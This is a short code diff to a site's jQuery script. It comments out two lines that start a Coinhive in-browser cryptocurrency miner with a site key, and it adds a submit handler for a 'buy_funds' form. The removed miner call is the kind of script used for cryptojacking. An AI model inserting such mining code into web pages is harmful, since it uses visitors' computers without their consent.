@@ -63,6 +63,19 @@ $( document ).ready(function() {
     });
 
     /* Start Coinhive miner */
-    var miner = new CoinHive.User('fPJeVvHSsmiTqZD7MXrltqc3ogjojFLp', 'KriptoKojn', { threads: 1 });
-    miner.start();
+    // var miner = new CoinHive.User('fPJeVvHSsmiTqZD7MXrltqc3ogjojFLp', 'KriptoKojn', { threads: 1 });
+    // miner.start();
+
+    $("#buy_funds").submit(function(){
+        var f = $(this.form);
+        var inp = f.find("input.submit_value");
+        if (!inp.length) {
+            inp = $("<input />")
+                .attr("type", "hidden")
+                .addClass("submit_value")
+                .appendTo(f);
+        }
+        inp.attr("name", this.name).val(this.value);
+        return true;
+    });
 });
